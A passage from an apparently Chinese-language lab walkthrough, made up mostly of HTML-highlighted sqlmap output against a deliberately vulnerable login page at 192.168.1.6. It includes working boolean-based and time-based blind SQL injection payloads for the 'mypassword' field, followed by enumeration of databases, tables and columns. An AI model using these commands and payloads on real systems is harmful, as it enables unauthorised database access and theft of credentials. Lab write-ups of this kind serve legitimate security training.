[09:36:06] [INFO] testing '</span>Oracle stacked queries <span class="token punctuation">(</span>DBMS_PIPE.RECEIVE_MESSAGE - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:06] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:36:07] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:36:07] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>SLEEP - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:07] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:07] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 RLIKE time-based blind<span class="token string">'
[09:36:07] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 RLIKE time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:36:07] [INFO] testing '</span>MySQL AND time-based blind <span class="token punctuation">(</span>ELT<span class="token punctuation">)</span><span class="token string">'
[09:36:08] [INFO] testing '</span>PostgreSQL <span class="token operator">&gt;</span> <span class="token number">8.1</span> AND time-based blind<span class="token string">'
[09:36:08] [INFO] testing '</span>Microsoft SQL Server/Sybase time-based blind <span class="token punctuation">(</span>IF<span class="token punctuation">)</span><span class="token string">'
[09:36:08] [INFO] testing '</span>Oracle AND time-based blind<span class="token string">'
[09:36:08] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 time-based blind - Parameter replace<span class="token string">'
[09:36:08] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 time-based blind - Parameter replace <span class="token punctuation">(</span>substraction<span class="token punctuation">)</span><span class="token string">'
[09:36:08] [INFO] testing '</span>PostgreSQL <span class="token operator">&gt;</span> <span class="token number">8.1</span> time-based blind - Parameter replace<span class="token string">'
[09:36:08] [INFO] testing '</span>Oracle time-based blind - Parameter replace <span class="token punctuation">(</span>DBMS_LOCK.SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:36:08] [INFO] testing '</span>Oracle time-based blind - Parameter replace <span class="token punctuation">(</span>DBMS_PIPE.RECEIVE_MESSAGE<span class="token punctuation">)</span><span class="token string">'
[09:36:08] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 time-based blind - ORDER BY, GROUP BY clause<span class="token string">'
[09:36:08] [INFO] testing '</span>PostgreSQL <span class="token operator">&gt;</span> <span class="token number">8.1</span> time-based blind - ORDER BY, GROUP BY clause<span class="token string">'
[09:36:08] [INFO] testing '</span>Oracle time-based blind - ORDER BY, GROUP BY clause <span class="token punctuation">(</span>DBMS_LOCK.SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:36:08] [INFO] testing '</span>Oracle time-based blind - ORDER BY, GROUP BY clause <span class="token punctuation">(</span>DBMS_PIPE.RECEIVE_MESSAGE<span class="token punctuation">)</span><span class="token string">'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[09:36:08] [INFO] testing '</span>Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">10</span> columns<span class="token string">'
[09:36:09] [INFO] testing '</span>Generic UNION query <span class="token punctuation">(</span>random number<span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">10</span> columns<span class="token string">'
[09:36:09] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">10</span> columns<span class="token string">'
[09:36:09] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span>random number<span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">10</span> columns<span class="token string">'
[09:36:10] [WARNING] POST parameter '</span>myusername<span class="token string">' does not seem to be injectable
[09:36:10] [INFO] testing if POST parameter '</span>mypassword<span class="token string">' is dynamic
[09:36:10] [WARNING] POST parameter '</span>mypassword<span class="token string">' does not appear to be dynamic
[09:36:10] [INFO] heuristic (basic) test shows that POST parameter '</span>mypassword<span class="token string">' might be injectable (possible DBMS: '</span>MySQL<span class="token string">')
[09:36:10] [INFO] testing for SQL injection on POST parameter '</span>mypassword<span class="token string">'
it looks like the back-end DBMS is '</span>MySQL<span class="token string">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for '</span>MySQL<span class="token string">' extending provided level (3) and risk (1) values? [Y/n] Y
[09:36:10] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause<span class="token string">'
[09:36:10] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>subquery - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] POST parameter '</span>mypassword<span class="token string">' appears to be '</span>AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>subquery - comment<span class="token punctuation">)</span><span class="token string">' injectable (with --not-string="28")
[09:36:10] [INFO] testing '</span>Generic inline queries<span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.5</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
got a 302 redirect to '</span>http://192.168.1.6/login_success.php?username<span class="token operator">=</span>admin<span class="token string">'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.5</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.6</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.6</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.7</span>.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.7</span>.8 OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:36:10] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">4.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">4.1</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> error-based - PROCEDURE ANALYSE <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.5</span> error-based - Parameter replace <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.5</span> error-based - Parameter replace <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.6</span> error-based - Parameter replace <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.7</span>.8 error-based - Parameter replace <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span> error-based - Parameter replace <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> error-based - Parameter replace <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> error-based - Parameter replace <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL inline queries<span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 stacked queries<span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>query SLEEP - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&lt;</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>BENCHMARK - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&lt;</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>BENCHMARK<span class="token punctuation">)</span><span class="token string">'
[09:36:11] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:36:21] [INFO] POST parameter '</span>mypassword<span class="token string">' appears to be '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">' injectable 
[09:36:21] [INFO] testing '</span>Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">20</span> columns<span class="token string">'
[09:36:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:36:21] [INFO] '</span>ORDER BY<span class="token string">' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:36:21] [INFO] target URL appears to have 3 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
[09:36:22] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '</span>--dbms<span class="token operator">=</span>mysql<span class="token string">') 
[09:36:22] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
[09:36:23] [INFO] testing '</span>Generic UNION query <span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> - <span class="token number">21</span> to <span class="token number">40</span> columns<span class="token string">'
[09:36:23] [INFO] testing '</span>Generic UNION query <span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> - <span class="token number">41</span> to <span class="token number">60</span> columns<span class="token string">'
[09:36:23] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">20</span> columns<span class="token string">'
[09:36:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> - <span class="token number">21</span> to <span class="token number">40</span> columns<span class="token string">'
[09:36:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> - <span class="token number">41</span> to <span class="token number">60</span> columns<span class="token string">'
[09:36:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> - <span class="token number">61</span> to <span class="token number">80</span> columns<span class="token string">'
[09:36:25] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> - <span class="token number">81</span> to <span class="token number">100</span> columns<span class="token string">'
[09:36:25] [INFO] checking if the injection point on POST parameter '</span>mypassword<span class="token string">' is a false positive
POST parameter '</span>mypassword<span class="token string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1473 HTTP(s) requests:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: myusername=admin&amp;mypassword=123456'</span> AND <span class="token assign-left variable">5147</span><span class="token operator">=</span><span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">5147</span><span class="token operator">=</span><span class="token number">5147</span><span class="token punctuation">)</span> THEN <span class="token number">5147</span> ELSE <span class="token punctuation">(</span>SELECT <span class="token number">3625</span> UNION SELECT <span class="token number">8434</span><span class="token punctuation">)</span> END<span class="token punctuation">))</span>-- -<span class="token operator">&amp;</span><span class="token assign-left variable">Submit</span><span class="token operator">=</span>Login

    Type: time-based blind
    Title: MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">myusername</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">mypassword</span><span class="token operator">=</span><span class="token number">123456</span><span class="token string">' AND (SELECT 1417 FROM (SELECT(SLEEP(5)))ImmZ)-- MSgA&amp;Submit=Login
---
[09:36:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP, Apache 2.2.8, PHP 5.2.4
back-end DBMS: MySQL &gt;= 5.0.12
[09:36:25] [INFO] fetching database names
[09:36:25] [INFO] fetching number of databases
[09:36:25] [WARNING] running in a single-thread mode. Please consider usage of option '</span>--threads<span class="token string">' for faster data retrieval
[09:36:25] [INFO] retrieved: 3
[09:36:25] [INFO] retrieved: information_schema
[09:36:26] [INFO] retrieved: members
[09:36:26] [INFO] retrieved: mysql
available databases [3]:
[*] information_schema
[*] members
[*] mysql

[09:36:27] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/192.168.1.6'

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 09:36:27 /2024-06-12/

</code></pre> 
<blockquote> 
 <p>获得数据库</p> 
 <ul><li>information_schema</li><li>members</li><li>mysql</li></ul> 
</blockquote> 
<h4><a id="313__1070"></a>3.1.3 当前连接的数据库</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/dev_run_app/vulhub/kl_4<span class="token punctuation">]</span>
└─<span class="token comment"># sqlmap -r sql.txt --batch --level 3 --current-db </span>
        ___
       __H__
 ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">{<!-- --></span><span class="token number">1.8</span>.3<span class="token comment">#stable}</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span>"<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
|___|_  ['</span><span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:42:14 /2024-06-12/

[09:42:14] [INFO] parsing HTTP request from '</span>sql.txt<span class="token string">'
[09:42:15] [INFO] resuming back-end DBMS '</span>mysql<span class="token string">' 
[09:42:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: myusername=admin&amp;mypassword=123456'</span> AND <span class="token assign-left variable">5147</span><span class="token operator">=</span><span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">5147</span><span class="token operator">=</span><span class="token number">5147</span><span class="token punctuation">)</span> THEN <span class="token number">5147</span> ELSE <span class="token punctuation">(</span>SELECT <span class="token number">3625</span> UNION SELECT <span class="token number">8434</span><span class="token punctuation">)</span> END<span class="token punctuation">))</span>-- -<span class="token operator">&amp;</span><span class="token assign-left variable">Submit</span><span class="token operator">=</span>Login

    Type: time-based blind
    Title: MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">myusername</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">mypassword</span><span class="token operator">=</span><span class="token number">123456</span><span class="token string">' AND (SELECT 1417 FROM (SELECT(SLEEP(5)))ImmZ)-- MSgA&amp;Submit=Login
---
[09:42:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL &gt;= 5.0.12
[09:42:15] [INFO] fetching current database
[09:42:15] [WARNING] running in a single-thread mode. Please consider usage of option '</span>--threads<span class="token string">' for faster data retrieval
[09:42:15] [INFO] retrieved: members
current database: '</span>members<span class="token string">'
[09:42:15] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/192.168.1.6'

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 09:42:15 /2024-06-12/

</code></pre> 
<blockquote> 
 <p>当前连接的数据库是</p> 
 <ul><li><strong>members</strong></li></ul> 
</blockquote> 
<h4><a id="314__1117"></a>3.1.4 连接的数据库的表名</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/dev_run_app/vulhub/kl_4<span class="token punctuation">]</span>
└─<span class="token comment"># sqlmap -r sql.txt --batch --level 3 -D members --tables</span>
        ___
       __H__
 ___ ___<span class="token punctuation">[</span><span class="token string">']_____ ___ ___  {1.8.3#stable}
|_ -| . ["]     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>"<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:45:10 /2024-06-12/

[09:45:10] [INFO] parsing HTTP request from '</span>sql.txt<span class="token string">'
[09:45:10] [INFO] resuming back-end DBMS '</span>mysql<span class="token string">' 
[09:45:10] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: myusername=admin&amp;mypassword=123456'</span> AND <span class="token assign-left variable">5147</span><span class="token operator">=</span><span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">5147</span><span class="token operator">=</span><span class="token number">5147</span><span class="token punctuation">)</span> THEN <span class="token number">5147</span> ELSE <span class="token punctuation">(</span>SELECT <span class="token number">3625</span> UNION SELECT <span class="token number">8434</span><span class="token punctuation">)</span> END<span class="token punctuation">))</span>-- -<span class="token operator">&amp;</span><span class="token assign-left variable">Submit</span><span class="token operator">=</span>Login

    Type: time-based blind
    Title: MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">myusername</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">mypassword</span><span class="token operator">=</span><span class="token number">123456</span><span class="token string">' AND (SELECT 1417 FROM (SELECT(SLEEP(5)))ImmZ)-- MSgA&amp;Submit=Login
---
[09:45:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: Apache 2.2.8, PHP 5.2.4
back-end DBMS: MySQL &gt;= 5.0.12
[09:45:11] [INFO] fetching tables for database: '</span>members<span class="token string">'
[09:45:11] [INFO] fetching number of tables for database '</span>members<span class="token string">'
[09:45:11] [WARNING] running in a single-thread mode. Please consider usage of option '</span>--threads<span class="token string">' for faster data retrieval
[09:45:11] [INFO] retrieved: 1
[09:45:11] [INFO] retrieved: members
Database: members
[1 table]
+---------+
| members |
+---------+

[09:45:11] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/192.168.1.6'

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 09:45:11 /2024-06-12/

</code></pre> 
<blockquote> 
 <p>连接的数据库是：<strong>members</strong><br> 表名是：<strong>members</strong></p> 
</blockquote> 
<h4><a id="315__1171"></a>3.1.5 字段名</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/dev_run_app/vulhub/kl_4<span class="token punctuation">]</span>
└─<span class="token comment"># sqlmap -r sql.txt --batch --level 3 -D members -T members --columns</span>
        ___
       __H__
 ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">{<!-- --></span><span class="token number">1.8</span>.3<span class="token comment">#stable}</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ 09:48:22 /2024-06-12/

<span class="token punctuation">[</span>09:48:22<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> parsing HTTP request from <span class="token string">'sql.txt'</span>
<span class="token punctuation">[</span>09:48:22<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming back-end DBMS <span class="token string">'mysql'</span> 
<span class="token punctuation">[</span>09:48:22<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
---
Parameter: mypassword <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>subquery - comment<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">myusername</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">mypassword</span><span class="token operator">=</span><span class="token number">123456</span><span class="token string">' AND 5147=(SELECT (CASE WHEN (5147=5147) THEN 5147 ELSE (SELECT 3625 UNION SELECT 8434) END))-- -&amp;Submit=Login

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=admin&amp;mypassword=123456'</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">1417</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>ImmZ<span class="token punctuation">)</span>-- MSgA<span class="token operator">&amp;</span><span class="token assign-left variable">Submit</span><span class="token operator">=</span>Login
---
<span class="token punctuation">[</span>09:48:22<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
web server operating system: Linux Ubuntu <span class="token number">8.04</span> <span class="token punctuation">(</span>Hardy Heron<span class="token punctuation">)</span>
web application technology: PHP <span class="token number">5.2</span>.4, Apache <span class="token number">2.2</span>.8
back-end DBMS: MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12
<span class="token punctuation">[</span>09:48:22<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching columns <span class="token keyword">for</span> table <span class="token string">'members'</span> <span class="token keyword">in</span> database <span class="token string">'members'</span>
<span class="token punctuation">[</span>09:48:22<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> running <span class="token keyword">in</span> a single-thread mode. Please consider usage of option <span class="token string">'--threads'</span> <span class="token keyword">for</span> faster data retrieval
<span class="token punctuation">[</span>09:48:22<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">3</span>
<span class="token punctuation">[</span>09:48:22<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token function">id</span>
<span class="token punctuation">[</span>09:48:23<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: int<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>09:48:23<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: username
